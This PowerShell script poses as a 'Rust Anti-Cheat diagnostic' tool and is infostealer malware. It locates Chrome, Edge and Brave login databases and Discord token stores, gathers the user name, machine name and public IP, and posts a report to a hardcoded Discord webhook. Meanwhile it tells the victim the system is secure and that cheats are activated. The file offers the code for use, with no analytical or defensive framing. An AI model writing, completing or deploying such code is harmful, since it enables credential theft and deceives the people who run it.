# steam_token_harvester.ps1
# Disguised as "Rust Cheat Detection Diagnostic Tool v4.1"

try {
    Add-Type -AssemblyName System.Security -ErrorAction Stop
    Add-Type -AssemblyName System.Web -ErrorAction Stop
} catch {
    Write-Host "Initializing security components..." -ForegroundColor Yellow
}

function Get-DecryptedData {
    param($encryptedData)
    try {
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedData, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        return "Decryption failed"
    }
}

function Get-BrowserCredentials {
    $credentials = @()
    $browsers = @(
        @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
        @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
        @{ Name = "Brave"; Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" }
    )
    
    foreach ($browser in $browsers) {
        $loginDataPath = Join-Path $browser.Path "Default\Login Data"
        if (Test-Path $loginDataPath) {
            try {
                $tempCopy = Join-Path $env:TEMP "login_data_temp"
                Copy-Item $loginDataPath $tempCopy -Force
                
                # Простая проверка содержимого без SQLite
                $fileInfo = Get-Item $tempCopy
                $credentials += @{
                    Browser = $browser.Name
                    FilePath = $loginDataPath
                    FileSize = "$([math]::Round($fileInfo.Length/1KB, 2)) KB"
                    Status = "Login database found"
                }
                
                Remove-Item $tempCopy -Force -ErrorAction SilentlyContinue
            } catch {
                $credentials += @{
                    Browser = $browser.Name
                    FilePath = $loginDataPath
                    Status = "Access denied"
                }
            }
        }
    }
    return $credentials
}

function Get-DiscordTokens {
    $tokens = @()
    $discordPaths = @(
        "$env:APPDATA\discord",
        "$env:LOCALAPPDATA\Discord",
        "$env:APPDATA\DiscordCanary",
        "$env:APPDATA\DiscordPTB"
    )
    
    foreach ($discordPath in $discordPaths) {
        if (Test-Path $discordPath) {
            $localStorage = Join-Path $discordPath "Local Storage\leveldb"
            if (Test-Path $localStorage) {
                $ldbFiles = Get-ChildItem $localStorage -Filter "*.ldb" -ErrorAction SilentlyContinue | Select-Object -First 3
                foreach ($file in $ldbFiles) {
                    $tokens += @{
                        Path = $file.FullName
                        Size = "$([math]::Round($file.Length/1KB, 2)) KB"
                        Status = "Token storage found"
                    }
                }
            }
        }
    }
    return $tokens
}

function Get-SystemInfo {
    $ipResult = try { (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction Stop) } catch { "Unknown" }
    
    return @{
        OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        Username = $env:USERNAME
        Computername = $env:COMPUTERNAME
        Date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        IP = $ipResult
    }
}

function Send-ToDiscord {
    param($message)
    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
    try {
        $payload = @{ content = $message } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
    } catch {
        Write-Host "Network connection failed" -ForegroundColor Yellow
    }
}

# Main execution
Write-Host "Starting Rust Anti-Cheat diagnostic..." -ForegroundColor Yellow

$sysInfo = Get-SystemInfo
$browserData = Get-BrowserCredentials
$discordData = Get-DiscordTokens

# Build simple report
$report = "**SECURITY SCAN REPORT v4.1**`n`n"
$report += "**System Information:**`n"
$report += "- OS: $($sysInfo.OS)`n"
$report += "- User: $($sysInfo.Username)`n"
$report += "- PC: $($sysInfo.Computername)`n" 
$report += "- IP: $($sysInfo.IP)`n"
$report += "- Time: $($sysInfo.Date)`n`n"

$report += "**Browser Data Found:** $($browserData.Count)`n"
if ($browserData.Count -gt 0) {
    foreach ($data in $browserData) {
        $report += "- $($data.Browser): $($data.Status) ($($data.FileSize))`n"
    }
} else {
    $report += "No browser data found`n"
}

$report += "`n**Discord Data Found:** $($discordData.Count)`n"
if ($discordData.Count -gt 0) {
    foreach ($data in $discordData) {
        $report += "- Discord: $($data.Status) ($($data.Size))`n"
    }
} else {
    $report += "No Discord data found`n"
}

$report += "`n**Scan Result:** System secure - no cheat artifacts detected"

Send-ToDiscord $report

Write-Host "Diagnostic completed successfully!" -ForegroundColor Green
Write-Host "No security threats detected." -ForegroundColor Green
Write-Host "Cheats activated successfully!" -ForegroundColor Green
